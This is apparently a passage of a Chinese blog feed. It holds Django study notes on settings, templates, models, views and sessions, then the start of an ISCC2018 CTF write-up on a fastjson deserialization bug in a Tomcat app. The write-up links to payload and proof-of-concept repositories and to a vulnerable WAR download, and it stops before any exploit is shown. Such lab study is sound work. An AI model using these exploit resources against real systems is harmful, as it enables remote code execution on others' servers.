      <content type="html"><![CDATA[<p><strong><em>django高级应用</em></strong></p><hr><p><br><br><br></p><h1 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h1><h2 id="管理静态文件"><a href="#管理静态文件" class="headerlink" title="管理静态文件"></a>管理静态文件</h2><p>项目中的CSS，图片，js都是静态文件</p><h2 id="配置静态文件"><a href="#配置静态文件" class="headerlink" title="配置静态文件"></a>配置静态文件</h2><ul><li><p>在settings文件中定义静态内容</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#逻辑规则</span></span><br><span class="line">STATIC_URL = '/static/' </span><br><span class="line"></span><br><span class="line"><span class="comment">#物理存储目录</span></span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">   os.path.join(BASE_DIR, 'static'),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>在项目根目录下创建static目录，再创建当前应用名称的目录</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysite/<span class="keyword">static</span>/myapp/</span><br></pre></td></tr></table></figure></li><li><p>在模板中可以使用硬编码</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/my_app/myexample.jpg</span><br></pre></td></tr></table></figure></li><li><p>在模板中可以使用static编码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; % load static <span class="keyword">from</span> staticfiles % &#125;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"&#123; % my_app/myexample.jpg % &#125;"</span> <span class="attribute">alt</span>=<span class="string">"My image"</span>/&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p><img src="\images\pasted-237.png" alt="upload successful"><br><img src="\images\pasted-238.png" alt="upload successful"><br><br><br><br></p><h1 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h1><p><img src="\images\pasted-239.png" alt="upload successful"><br><img src="\images\pasted-240.png" alt="upload successful"><br><img src="\images\pasted-241.png" alt="upload successful"><br><br><br><br></p><h1 id="Admin站点"><a href="#Admin站点" class="headerlink" title="Admin站点"></a>Admin站点</h1><p><img src="\images\pasted-242.png" alt="upload successful"></p><h2 id="ModelAdmin对象"><a href="#ModelAdmin对象" class="headerlink" title="ModelAdmin对象"></a>ModelAdmin对象</h2><p><img src="\images\pasted-245.png" alt="upload successful"></p><h3 id="列表页选项"><a href="#列表页选项" class="headerlink" title="列表页选项"></a>列表页选项</h3><p><img src="\images\pasted-246.png" alt="upload successful"><br><img src="\images\pasted-247.png" alt="upload successful"><br><img src="\images\pasted-248.png" alt="upload successful"><br><img src="\images\pasted-249.png" alt="upload successful"></p><h3 id="增加与修改页选项"><a href="#增加与修改页选项" class="headerlink" title="增加与修改页选项"></a>增加与修改页选项</h3><p><img src="\images\pasted-250.png" alt="upload successful"></p><h2 id="InlineModelAdmin对象"><a href="#InlineModelAdmin对象" class="headerlink" title="InlineModelAdmin对象"></a>InlineModelAdmin对象</h2><p><img src="\images\pasted-251.png" alt="upload successful"></p><h2 id="重写admin模板"><a href="#重写admin模板" class="headerlink" title="重写admin模板"></a>重写admin模板</h2><p><img src="\images\pasted-252.png" alt="upload successful"><br><br><br><br></p><h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><h2 id="Paginator对象"><a href="#Paginator对象" class="headerlink" title="Paginator对象"></a>Paginator对象</h2><p><img src="\images\pasted-253.png" alt="upload successful"></p><h2 id="Page对象"><a href="#Page对象" class="headerlink" title="Page对象"></a>Page对象</h2><p><img src="\images\pasted-254.png" alt="upload successful"><br><br><br><br></p><h1 id="使用jquery完成ajax"><a href="#使用jquery完成ajax" class="headerlink" title="使用jquery完成ajax"></a>使用jquery完成ajax</h1><p><img src="\images\pasted-255.png" alt="upload successful"></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Django学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>4_Django模板</title>
      <link href="/2018/07/29/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/"/>
      <url>/2018/07/29/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/</url>
      <content type="html"><![CDATA[<p><strong><em>Templates</em></strong></p><hr><p><br><br><br></p><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p><img src="\images\pasted-149.png" alt="upload successful"></p><h2 id="模板处理"><a href="#模板处理" class="headerlink" title="模板处理"></a>模板处理</h2><p><img src="\images\pasted-150.png" alt="upload successful"></p><h2 id="快捷函数"><a href="#快捷函数" class="headerlink" title="快捷函数"></a>快捷函数</h2><p><img src="\images\pasted-151.png" alt="upload successful"><br><br><br><br></p><h1 id="定义模板"><a href="#定义模板" class="headerlink" title="定义模板"></a>定义模板</h1><p><strong><em>模板语言包括</em></strong></p><ul><li>变量</li><li>标签    </li><li>过滤器    { % 代码块 %}</li><li>注释      <h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><img src="\images\pasted-152.png" alt="upload successful"><h2 id="在模板中调用对象的方法"><a href="#在模板中调用对象的方法" class="headerlink" title="在模板中调用对象的方法"></a>在模板中调用对象的方法</h2><img src="\images\pasted-153.png" alt="upload successful"><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><img src="\images\pasted-154.png" alt="upload successful"><br><img src="\images\pasted-155.png" alt="upload successful"><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><img src="\images\pasted-156.png" alt="upload successful"><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><img src="\images\pasted-157.png" alt="upload successful"><br><br><br><br></li></ul><h1 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h1><p><img src="\images\pasted-158.png" alt="upload successful"></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><img src="\images\pasted-159.png" alt="upload successful"></p><h2 id="三层继承模型"><a href="#三层继承模型" class="headerlink" title="三层继承模型"></a>三层继承模型</h2><p><img src="\images\pasted-160.png" alt="upload successful"><br><br><br><br></p><h1 id="HTML转义"><a href="#HTML转义" class="headerlink" title="HTML转义"></a>HTML转义</h1><p><img src="\images\pasted-161.png" alt="upload successful"></p><h2 id="会被自动转义的字符"><a href="#会被自动转义的字符" class="headerlink" title="会被自动转义的字符"></a>会被自动转义的字符</h2><p><img src="\images\pasted-162.png" alt="upload successful"></p><h2 id="关闭转义"><a href="#关闭转义" class="headerlink" title="关闭转义"></a>关闭转义</h2><p><img src="\images\pasted-163.png" alt="upload successful"></p><h2 id="字符串字面值"><a href="#字符串字面值" class="headerlink" title="字符串字面值"></a>字符串字面值</h2><p><img src="\images\pasted-164.png" alt="upload successful"><br><br><br><br></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><img src="\images\pasted-166.png" alt="upload successful"><br><br><br><br></p><h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><p><img src="\images\pasted-167.png" alt="upload successful"></p><h2 id="验证码视图"><a href="#验证码视图" class="headerlink" title="验证码视图"></a>验证码视图</h2><p><img src="\images\pasted-168.png" alt="upload successful"><br><img src="\images\pasted-169.png" alt="upload successful"><br><img src="\images\pasted-170.png" alt="upload successful"></p><h2 id="配置url"><a href="#配置url" class="headerlink" title="配置url"></a>配置url</h2><p><img src="\images\pasted-171.png" alt="upload successful"></p><h2 id="显示验证码"><a href="#显示验证码" class="headerlink" title="显示验证码"></a>显示验证码</h2><p><img src="\images\pasted-172.png" alt="upload successful"></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="\images\pasted-173.png" alt="upload successful"></p><h2 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h2><ul><li>可以在网上搜索“验证码”，找到一些第三方验证码提供网站，阅读文档，使用到项目中<br><br><br><br></li></ul>]]></content>
      
      <categories>
          
          <category> Django学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>3_Django模型</title>
      <link href="/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/"/>
      <url>/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/</url>
      <content type="html"><![CDATA[<p><strong><em>Models.py</em></strong></p><hr><p><br><br><br></p><h1 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h1><h2 id="对象-关系-映射"><a href="#对象-关系-映射" class="headerlink" title="对象-关系-映射"></a>对象-关系-映射</h2><p>根据对象的类型生成表结构<br>将对象，列表的操作，转换为sql语句<br>将sql查询到的结果转换为对象，列表  </p><p>Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表<br><img src="\images\pasted-75.png" alt="upload successful"><br><br></p><h2 id="使用mysql数据库"><a href="#使用mysql数据库" class="headerlink" title="使用mysql数据库"></a>使用mysql数据库</h2><p>pip install mysql-python</p><ul><li>在mysql中创建数据库<br>create database test2 charest=utf8;</li><li>打开settings.py文件，修改DATABASES项<br>可以看到我们现在用的是sqlite3这个数据库(自己生成一个db.sqlite3数据库文件)<br><img src="\images\pasted-77.png" alt="upload successful"><br><img src="\images\pasted-79.png" alt="upload successful"><br>settings.py中改个配置就可以用我们的mysql数据库<br><img src="\images\pasted-76.png" alt="upload successful"><br><img src="\images\pasted-78.png" alt="upload successful"><br><br></li></ul><h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><p><img src="\images\pasted-81.png" alt="upload successful"></p><h2 id="使用已有数据库生成模型类"><a href="#使用已有数据库生成模型类" class="headerlink" title="使用已有数据库生成模型类"></a>使用已有数据库生成模型类</h2><p>python manage.py inspectdb &gt; booktest/models.py<br><br><br><br></p><h1 id="创建添加应用"><a href="#创建添加应用" class="headerlink" title="创建添加应用"></a>创建添加应用</h1><p>python manage.py startapp booktest<br>创建应用之后需要把应用booktest添加到settings.py的INSTALLED_APPS<br><img src="\images\pasted-82.png" alt="upload successful"></p><h2 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h2><p><img src="\images\pasted-83.png" alt="upload successful"></p><h2 id="定义属性"><a href="#定义属性" class="headerlink" title="定义属性"></a>定义属性</h2><p><img src="\images\pasted-84.png" alt="upload successful"></p><h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><p><img src="\images\pasted-85.png" alt="upload successful"></p><h2 id="字段选项"><a href="#字段选项" class="headerlink" title="字段选项"></a>字段选项</h2><p><img src="\images\pasted-86.png" alt="upload successful"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="\images\pasted-87.png" alt="upload successful"><br><br><br></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><ul><li>在models.py中定义表结构<br><img src="\images\pasted-88.png" alt="upload successful"></li><li>生成迁移之后<br>python manage.py makemigrations<br><img src="\images\pasted-89.png" alt="upload successful"></li><li>执行迁移之后<br>python manage.py migrate<br><img src="\images\pasted-90.png" alt="upload successful"><br><br><br></li></ul><h1 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h1><p><img src="\images\pasted-91.png" alt="upload successful"></p><h2 id="管理器（可自定义）"><a href="#管理器（可自定义）" class="headerlink" title="管理器（可自定义）"></a>管理器（可自定义）</h2><p>模型类—&gt;管理器—&gt;数据库（管理器是模型类的一个属性，用于将对象和数据表映射）<br><img src="\images\pasted-92.png" alt="upload successful"><br><img src="\images\pasted-93.png" alt="upload successful"><br><img src="\images\pasted-94.png" alt="upload successful"><br><img src="\images\pasted-95.png" alt="upload successful"></p><h2 id="模型类的创建方法"><a href="#模型类的创建方法" class="headerlink" title="模型类的创建方法"></a>模型类的创建方法</h2><p>&emsp;&emsp;在自定义的模型类中写<strong>init</strong>方法时会报错，因为model.Model中已经有了<strong>init</strong>方法，那我们怎么快捷创建每个模型类呢？<br><strong><em>解决方法：</em></strong>  </p><ul><li>(1) 创建<strong><em>类方法</em></strong>。 我们在模型类中，自定义一个创建模型类的方法<br><img src="\images\pasted-96.png" alt="upload successful"><br>我们在python manage.py shell中，创建一个abc对象：<br><img src="\images\pasted-97.png" alt="upload successful"><br>报错是因为时区问题，不影响<br><img src="\images\pasted-98.png" alt="upload successful"></li><li>(2) 在<strong><em>自定义的管理器</em></strong>中，创建对象方法 （不在类中做这件事）<br><img src="\images\pasted-99.png" alt="upload successful"><br><img src="\images\pasted-100.png" alt="upload successful"><br><img src="\images\pasted-101.png" alt="upload successful"><br><br><br></li></ul><h1 id="模型查询"><a href="#模型查询" class="headerlink" title="模型查询"></a>模型查询</h1><p><img src="\images\pasted-102.png" alt="upload successful"></p><h2 id="查询集"><a href="#查询集" class="headerlink" title="查询集"></a>查询集</h2><p><img src="\images\pasted-103.png" alt="upload successful"></p><h3 id="限制查询集"><a href="#限制查询集" class="headerlink" title="限制查询集"></a>限制查询集</h3><p><img src="\images\pasted-104.png" alt="upload successful"></p><h3 id="查询集的缓存"><a href="#查询集的缓存" class="headerlink" title="查询集的缓存"></a>查询集的缓存</h3><p><img src="\images\pasted-105.png" alt="upload successful"></p><h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><p><img src="\images\pasted-106.png" alt="upload successful"></p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p><img src="\images\pasted-107.png" alt="upload successful"><br><img src="\images\pasted-108.png" alt="upload successful"><br><br><br></p><h1 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h1><p><img src="\images\pasted-109.png" alt="upload successful"></p><h2 id="F对象"><a href="#F对象" class="headerlink" title="F对象"></a>F对象</h2><p><img src="\images\pasted-110.png" alt="upload successful"></p><h2 id="Q对象"><a href="#Q对象" class="headerlink" title="Q对象"></a>Q对象</h2><p><img src="\images\pasted-111.png" alt="upload successful"></p>]]></content>
      
      <categories>
          
          <category> Django学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2_Django视图</title>
      <link href="/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/"/>
      <url>/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/</url>
      <content type="html"><![CDATA[<p><strong><em>Views.py</em></strong></p><hr><p><br><br><br></p><h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><p><img src="\images\pasted-112.png" alt="upload successful"></p><h2 id="URL匹配的过程"><a href="#URL匹配的过程" class="headerlink" title="URL匹配的过程"></a>URL匹配的过程</h2><p><img src="\images\pasted-113.png" alt="upload successful"><br><img src="\images\pasted-114.png" alt="upload successful"><br><img src="\images\pasted-115.png" alt="upload successful"><br><img src="\images\pasted-116.png" alt="upload successful"><br>url也可以写在应用(booktest)中:<br><img src="\images\pasted-117.png" alt="upload successful"><br><img src="\images\pasted-118.png" alt="upload successful"><br><img src="\images\pasted-119.png" alt="upload successful"></p><h2 id="URLconf"><a href="#URLconf" class="headerlink" title="URLconf"></a>URLconf</h2><p><img src="\images\pasted-122.png" alt="upload successful"></p><h2 id="其他的URLconfs"><a href="#其他的URLconfs" class="headerlink" title="其他的URLconfs"></a>其他的URLconfs</h2><p><img src="\images\pasted-120.png" alt="upload successful"></p><h2 id="URL的反向解析"><a href="#URL的反向解析" class="headerlink" title="URL的反向解析"></a>URL的反向解析</h2><p><img src="\images\pasted-121.png" alt="upload successful"><br><br><br><br></p><h1 id="错误视图"><a href="#错误视图" class="headerlink" title="错误视图"></a>错误视图</h1><p>Django原生自带几个默认视图用于处理HTTP错误</p><h2 id="404-page-not-found-视图"><a href="#404-page-not-found-视图" class="headerlink" title="404(page not found)视图"></a>404(page not found)视图</h2><p><img src="\images\pasted-123.png" alt="upload successful"></p><h2 id="500-server-error-视图"><a href="#500-server-error-视图" class="headerlink" title="500(server error)视图"></a>500(server error)视图</h2><p><img src="\images\pasted-130.png" alt="upload successful"></p><h2 id="400-bad-request-视图"><a href="#400-bad-request-视图" class="headerlink" title="400(bad request)视图"></a>400(bad request)视图</h2><p><img src="\images\pasted-131.png" alt="upload successful"><br><br><br><br></p><h1 id="HttpRequest对象"><a href="#HttpRequest对象" class="headerlink" title="HttpRequest对象"></a>HttpRequest对象</h1><ul><li>服务器收到http协议的请求后，会根据报文创建HttpRequest对象  </li><li>视图函数的第一个参数是HttpRequest对象</li><li>在django.http模块中定义了HttpRequest对象的API<br><img src="\images\pasted-124.png" alt="upload successful"><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><img src="\images\pasted-125.png" alt="upload successful"><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2></li><li>1、get()<br>作用：根据键获取值<br>只能获取一个值<br><a href="http://www.baidu.com/abc?a=1&amp;b=2&amp;c=3" target="_blank" rel="noopener">www.baidu.com/abc?a=1&amp;b=2&amp;c=3</a></li><li>2、getlist()<br>将键的值以列表的形式返回<br>可以获取多个值<br><a href="http://www.baidu.com/abc?a=1&amp;a=2&amp;c=3" target="_blank" rel="noopener">www.baidu.com/abc?a=1&amp;a=2&amp;c=3</a>  <h2 id="QueryDict对象"><a href="#QueryDict对象" class="headerlink" title="QueryDict对象"></a>QueryDict对象</h2><img src="\images\pasted-126.png" alt="upload successful"><h2 id="GET属性"><a href="#GET属性" class="headerlink" title="GET属性"></a>GET属性</h2><img src="\images\pasted-127.png" alt="upload successful"><br><img src="\images\pasted-128.png" alt="upload successful"><br><img src="\images\pasted-129.png" alt="upload successful"><h2 id="POST属性"><a href="#POST属性" class="headerlink" title="POST属性"></a>POST属性</h2><img src="\images\pasted-137.png" alt="upload successful"><br><br><br><br></li></ul><h1 id="HttpResponse对象"><a href="#HttpResponse对象" class="headerlink" title="HttpResponse对象"></a>HttpResponse对象</h1><p><img src="\images\pasted-132.png" alt="upload successful"></p><h2 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h2><p><img src="\images\pasted-133.png" alt="upload successful"></p><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p><img src="\images\pasted-134.png" alt="upload successful"></p><h2 id="子类HttpResponseRedirect"><a href="#子类HttpResponseRedirect" class="headerlink" title="子类HttpResponseRedirect"></a>子类HttpResponseRedirect</h2><p><img src="\images\pasted-135.png" alt="upload successful"><br><strong><em>HttpResponseRedirect()可简写为redirect()</em></strong></p><h2 id="子类JsonResponse"><a href="#子类JsonResponse" class="headerlink" title="子类JsonResponse"></a>子类JsonResponse</h2><p><img src="\images\pasted-136.png" alt="upload successful"><br><br><br><br></p><h1 id="状态保持"><a href="#状态保持" class="headerlink" title="状态保持"></a>状态保持</h1><p><img src="\images\pasted-138.png" alt="upload successful"></p><h2 id="启用session"><a href="#启用session" class="headerlink" title="启用session"></a>启用session</h2><p><img src="\images\pasted-139.png" alt="upload successful"></p><h2 id="使用session"><a href="#使用session" class="headerlink" title="使用session"></a>使用session</h2><p><img src="\images\pasted-140.png" alt="upload successful"></p><h2 id="用户登录示例"><a href="#用户登录示例" class="headerlink" title="用户登录示例"></a>用户登录示例</h2><h3 id="在views-py中创建视图"><a href="#在views-py中创建视图" class="headerlink" title="在views.py中创建视图"></a>在views.py中创建视图</h3><p><img src="\images\pasted-142.png" alt="upload successful"> </p><h3 id="配置url"><a href="#配置url" class="headerlink" title="配置url"></a>配置url</h3><p><img src="\images\pasted-143.png" alt="upload successful"></p><h3 id="创建模板index-html"><a href="#创建模板index-html" class="headerlink" title="创建模板index.html"></a>创建模板index.html</h3><p><img src="\images\pasted-144.png" alt="upload successful"></p><h3 id="创建模板login-html"><a href="#创建模板login-html" class="headerlink" title="创建模板login.html"></a>创建模板login.html</h3><p><img src="\images\pasted-145.png" alt="upload successful"></p><h2 id="会话过期时间"><a href="#会话过期时间" class="headerlink" title="会话过期时间"></a>会话过期时间</h2><p><img src="\images\pasted-146.png" alt="upload successful"></p><h2 id="存储session"><a href="#存储session" class="headerlink" title="存储session"></a>存储session</h2><p><img src="\images\pasted-147.png" alt="upload successful"></p><h2 id="使用Redis缓存session"><a href="#使用Redis缓存session" class="headerlink" title="使用Redis缓存session"></a>使用Redis缓存session</h2><p><img src="\images\pasted-148.png" alt="upload successful"><br><br><br><br></p><h1 id="登录认证逻辑"><a href="#登录认证逻辑" class="headerlink" title="登录认证逻辑"></a>登录认证逻辑</h1><p>利用django封装好的authenticate()函数，认证登录<br><img src="\images\pasted-141.png" alt="upload successful"><br>Django防止越权，直接访问127.0.0.1:8000/manage/不允许访问</p><pre><code>from django.contrib.auth.decorators import login_required  @login_required  </code></pre><p>如果想限制某个试图函数必须登录才能访问，则在函数前面加上@login_required即可<br>(记得清除浏览器缓存)</p>]]></content>
      
      <categories>
          
          <category> Django学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>1_Django概述</title>
      <link href="/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
      <content type="html"><![CDATA[<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p>Django安装：pip install django==1.10.3<br>安装前段框架Bootstrap3，利用其结合Django开发Web页面：  pip install django-bootstrap3<br>使用PyMysql连接mysql数据库：  pip install PyMySQL<br><br><br><br></p><h1 id="Django框架介绍"><a href="#Django框架介绍" class="headerlink" title="Django框架介绍"></a>Django框架介绍</h1><p>&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MVT模式。它们各自的职责如下：</p><table><thead><tr><th>层次</th><th>职责</th></tr></thead><tbody><tr><td>模型（Model），即数据存取层</td><td>处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。  </td></tr><tr><td>模板(Template)，即业务逻辑层</td><td>处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。</td></tr><tr><td>视图（View），即表现层</td><td>存取模型及调取恰当模板的相关逻辑。模型与模板的桥梁。</td></tr></tbody></table><p>&emsp;&emsp;从以上表述可以看出Django 视图不处理用户输入，而仅仅决定要展现哪些数据给用户，而Django 模板 仅仅决定如何展现Django视图指定的数据。或者说, Django将MVC中的视图进一步分解为 Django视图 和 Django模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得Django的模板可以根据需要随时替换，而不仅仅限制于内置的模板。</p><p>&emsp;&emsp;至于MVC控制器部分，由Django框架的URLconf来实现。URLconf机制是使用正则表达式匹配URL，然后调用合适的Python函数。URLconf对于URL的规则没有任何限制，你完全可以设计成任意的URL风格，不管是传统的，RESTful的，或者是另类的。框架把控制层给封装了，无非与数据交互这层都是数据库表的读,写,删除,更新的操作。在写程序的时候，只要调用相应的方法就行了，感觉很方便。程序员把控制层东西交给Django自动完成了。 只需要编写非常少的代码完成很多的事情。所以，它比MVC框架考虑的问题要深一步，因为我们程序员大都在写控制层的程序。现在这个工作交给了框架，仅需写很少的调用代码，大大提高了工作效率。</p><h2 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a>web框架</h2><p><img src="\images\pasted-71.png" alt="upload successful"></p><h2 id="什么是ORM？"><a href="#什么是ORM？" class="headerlink" title="什么是ORM？"></a>什么是ORM？</h2><p><img src="\images\pasted-72.png" alt="upload successful"></p><h2 id="Django框架"><a href="#Django框架" class="headerlink" title="Django框架"></a>Django框架</h2><p>&emsp;&emsp;目录分开，就必须有机制将他们在内里进行耦合。在Django中，urls、orm、static、settings等起着重要的作用。一个典型的业务流程是如下图所示：<br><img src="\images\pasted-70.png" alt="upload successful"><br>&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MTV模式。<br><br><br><br></p><h1 id="Django优点"><a href="#Django优点" class="headerlink" title="Django优点"></a>Django优点</h1><ul><li>强大的数据库功能<br>    用 python 的类继承，几行代码就可以拥有一个丰富、动态的数据库操作接口（API），如果需要，你也能执行 SQL 语句ORM（Object-Relational-Mapping“对象-关系-映射”），它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库。</li><li>自带强大的后台功能<br>    几行代码就让网站拥有一个强大的后台，轻松管理内容。</li><li>优雅的网址<br>    在urls.py中用正则匹配网址，传递到对应的函数。(需要注意的是:正则是一种独立的语法，并不是哪个语言所拥有的。)</li><li>具有模板系统<br>    强大，易扩展的模板系统，设计简易，代码和样式分开设计，更易管理。</li><li>缓存系统<br>&emsp;&emsp;Django和memcached、redis或者其他的缓存系统联用，表现更出色，提高了页面的加载速度。<br>&emsp;&emsp;templates 文件夹views.py 中的函数渲染 templates 中的 Html 模板，得到动态内容的网页，当然可以用缓存来提高速度。</li><li>国际化<br>    完全支持多语言应用，允许你定义翻译的字符，轻松翻译成不同国家的语言。<br><br><br><br></li></ul><h1 id="Django基本操作"><a href="#Django基本操作" class="headerlink" title="Django基本操作"></a>Django基本操作</h1><h2 id="创建项目-test1"><a href="#创建项目-test1" class="headerlink" title="创建项目(test1)"></a>创建项目(test1)</h2><p>django-admin startproject test1<br><img src="\images\pasted-73.png" alt="upload successful"></p><h2 id="创建应用-booktest"><a href="#创建应用-booktest" class="headerlink" title="创建应用(booktest)"></a>创建应用(booktest)</h2><p>python manage.py startapp booktest<br><img src="\images\pasted-74.png" alt="upload successful"></p><h2 id="创建更改的文件-（生成迁移）"><a href="#创建更改的文件-（生成迁移）" class="headerlink" title="创建更改的文件 （生成迁移）"></a>创建更改的文件 （生成迁移）</h2><p>python manage.py makemigrations </p><h2 id="将生成的py文件应用到数据库-（执行迁移）"><a href="#将生成的py文件应用到数据库-（执行迁移）" class="headerlink" title="将生成的py文件应用到数据库 （执行迁移）"></a>将生成的py文件应用到数据库 （执行迁移）</h2><p>python manage.py migrate</p><h2 id="创建一个管理员用户（按提示输入用户名，邮箱，密码）"><a href="#创建一个管理员用户（按提示输入用户名，邮箱，密码）" class="headerlink" title="创建一个管理员用户（按提示输入用户名，邮箱，密码）"></a>创建一个管理员用户（按提示输入用户名，邮箱，密码）</h2><p>python manage.py createsuperuser</p><h2 id="运行（可以指定ip地址和端口号）"><a href="#运行（可以指定ip地址和端口号）" class="headerlink" title="运行（可以指定ip地址和端口号）"></a>运行（可以指定ip地址和端口号）</h2><p>#python manage.py runserver 127.0.0.1:8001</p>]]></content>
      
      <categories>
          
          <category> Django学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISCC2018线下赛总结</title>
      <link href="/2018/06/26/ISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>/2018/06/26/ISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>先拿自己靶机，攻下高地，进入公共区域攻防<br>这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的<br>给了一个环境，是Tomcat，开了8080端口<br><img src="\images\pasted-57.png" alt="upload successful"></p><p>比赛信息是192.168.43.70/whatisyourname/，这里用到了<strong>fastjson反序列化漏洞</strong>，熟悉Java的同学应该能看出来(但我是真的看不出来（╯－＿－）╯╧╧ )<br><img src="\images\pasted-58.png" alt="upload successful"><br><br><br></p><h1 id="fastjson反序列化漏洞参考："><a href="#fastjson反序列化漏洞参考：" class="headerlink" title="fastjson反序列化漏洞参考："></a>fastjson反序列化漏洞参考：</h1><p><a href="https://blog.csdn.net/yaofeino1/article/details/76377080" target="_blank" rel="noopener">https://blog.csdn.net/yaofeino1/article/details/76377080</a><br><a href="https://github.com/iBearcat/Fastjson-Payload" target="_blank" rel="noopener">https://github.com/iBearcat/Fastjson-Payload</a><br><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a><br><br><br><br></p><h1 id="环境源码下载"><a href="#环境源码下载" class="headerlink" title="环境源码下载"></a>环境源码下载</h1><p>通过github下载含有漏洞环境的web源代码<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">下载地址</a><br>直接将war包放到tomcat的webapp目录下，运行tomcat就行：<br><img src="\images\pasted-66.png" alt="upload successful"><br><br><br></p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" 